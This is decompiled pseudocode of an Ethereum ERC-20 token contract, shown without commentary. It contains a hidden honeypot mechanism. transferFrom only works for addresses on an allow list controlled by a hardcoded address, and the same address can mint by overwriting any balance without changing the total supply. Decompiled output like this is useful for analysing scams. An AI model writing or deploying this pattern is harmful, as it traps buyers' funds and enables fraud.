contract main {




// =====================  Runtime code  =====================


address owner;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
uint256 totalSupply;
mapping of uint256 balances;
mapping of uint8 stor6;
mapping of uint256 allowed;

function name() {
    return name[0 len name.length]
}

function totalSupply() {
    return totalSupply
}

function balances(address arg1) {
    return balances[arg1]
}

function decimals() {
    return decimals
}

function allowed(address arg1, address arg2) {
    return allowed[arg1][arg2]
}

function balanceOf(address arg1) {
    return balances[address(arg1)]
}

function owner() {
    return owner
}

function symbol() {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) {
    return allowed[address(arg1)][address(arg2)]
}

function allow(address arg1) {
    return bool(stor6[arg1])
}

function _fallback() payable {
    revert
}

function mint(address arg1, uint256 arg2) {
    require 0x367394d4c9388848be78a34554862eaa83fb224c == msg.sender
    balances[address(arg1)] = arg2
}

function approve(address arg1, uint256 arg2) {
    allowed[msg.sender][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function addAllow(address arg1, bool arg2) {
    require 0x367394d4c9388848be78a34554862eaa83fb224c == msg.sender
    stor6[address(arg1)] = uint8(arg2)
}

function transferOwnership(address arg1) {
    require 0x367394d4c9388848be78a34554862eaa83fb224c == msg.sender
    require arg1
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function transfer(address arg1, uint256 arg2) {
    require arg1
    require arg2 <= balances[msg.sender]
    require arg2 <= balances[msg.sender]
    balances[msg.sender] -= arg2
    require arg2 + balances[arg1] >= balances[arg1]
    balances[address(arg1)] = arg2 + balances[arg1]
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require arg2
    require arg3 <= balances[address(arg1)]
    require arg3 <= allowed[address(arg1)][msg.sender]
    require 1 == bool(stor6[address(arg1)])
    require arg3 <= balances[address(arg1)]
    balances[address(arg1)] -= arg3
    require arg3 + balances[arg2] >= balances[arg2]
    balances[address(arg2)] = arg3 + balances[arg2]
    require arg3 <= allowed[address(arg1)][msg.sender]
    allowed[address(arg1)][msg.sender] -= arg3
    emit Transfer(arg3, arg1, arg2);
    return 1
}



}
